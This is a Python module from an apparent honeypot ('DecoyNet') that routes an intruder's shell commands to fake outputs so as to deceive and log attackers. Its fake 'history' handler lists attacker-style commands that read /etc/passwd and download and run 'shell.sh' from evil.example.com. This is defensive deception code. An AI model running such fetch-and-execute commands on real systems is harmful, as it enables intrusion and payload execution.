"""
Routes attacker commands to fake responses.
Also triggers deception and malware-capture side-effects.
"""

import random
import logging
from DecoyNet_core.fake_shell import FakeShell
from deception.fake_filesystem import FakeFilesystem
from deception.response_mutator import ResponseMutator

logger = logging.getLogger(__name__)

_FS = FakeFilesystem()
_MUT = ResponseMutator()

_UNAME = "Linux {host} 5.15.0-76-generic #83-Ubuntu SMP x86_64 GNU/Linux"
_WHOAMI = {"root": "root", "admin": "admin", "ubuntu": "ubuntu"}
_ID     = "uid=0(root) gid=0(root) groups=0(root)"

_CMD_MAP: dict[str, callable] = {}


def _cmd(name):
    def decorator(fn):
        _CMD_MAP[name] = fn
        return fn
    return decorator


class CommandParser:
    def __init__(self, shell: FakeShell):
        self.shell = shell

    def execute(self, raw: str, ip: str) -> str:
        parts = raw.strip().split()
        if not parts:
            return ""
        cmd, args = parts[0], parts[1:]
        logger.debug(f"[{ip}] CMD: {raw}")

        handler = _CMD_MAP.get(cmd)
        if handler:
            result = handler(self.shell, args)
        else:
            result = f"-bash: {cmd}: command not found"

        return _MUT.mutate(result)


# ── Command handlers ────────────────────────────────────────────────────────

@_cmd("uname")
def _uname(shell, args):
    if "-a" in args:
        return _UNAME.format(host=shell.hostname)
    return "Linux"


@_cmd("whoami")
def _whoami(shell, args):
    return shell.user


@_cmd("id")
def _id(shell, args):
    return _ID


@_cmd("pwd")
def _pwd(shell, args):
    return shell.cwd


@_cmd("cd")
def _cd(shell, args):
    return shell.change_dir(args[0] if args else "~")


@_cmd("ls")
def _ls(shell, args):
    path = args[-1] if args and not args[-1].startswith("-") else shell.cwd
    return _FS.listdir(path)


@_cmd("cat")
def _cat(shell, args):
    if not args:
        return ""
    return _FS.read_file(args[0])


@_cmd("echo")
def _echo(shell, args):
    return " ".join(args)


@_cmd("env")
def _env(shell, args):
    return "\n".join(f"{k}={v}" for k, v in shell.env.items())


@_cmd("ifconfig")
def _ifconfig(shell, args):
    return (
        "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n"
        "        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255\n"
        "        ether 08:00:27:ab:cd:ef  txqueuelen 1000  (Ethernet)\n"
    )


@_cmd("ps")
def _ps(shell, args):
    return (
        "  PID TTY          TIME CMD\n"
        "    1 ?        00:00:02 systemd\n"
        "  412 ?        00:00:00 sshd\n"
        f" 1337 pts/0    00:00:00 bash\n"
        f" 1338 pts/0    00:00:00 ps\n"
    )


@_cmd("wget")
def _wget(shell, args):
    url = args[0] if args else ""
    return f"--2024-01-01 12:00:00--  {url}\nConnecting... connected.\nHTTP request sent, awaiting response... 200 OK\nSaved."


@_cmd("curl")
def _curl(shell, args):
    return '{"status":"ok","message":"pong"}'


@_cmd("python3")
@_cmd("python")
def _python(shell, args):
    return "Python 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]\nType \"help\" for more info."


@_cmd("sudo")
def _sudo(shell, args):
    return "[sudo] password for " + shell.user + ":"


@_cmd("history")
def _history(shell, args):
    cmds = ["ls -la", "cat /etc/passwd", "wget http://evil.example.com/shell.sh",
            "chmod +x shell.sh", "./shell.sh", "ps aux", "netstat -an"]
    return "\n".join(f"  {i+1}  {c}" for i, c in enumerate(cmds))


@_cmd("passwd")
def _passwd(shell, args):
    return "passwd: Authentication token manipulation error"
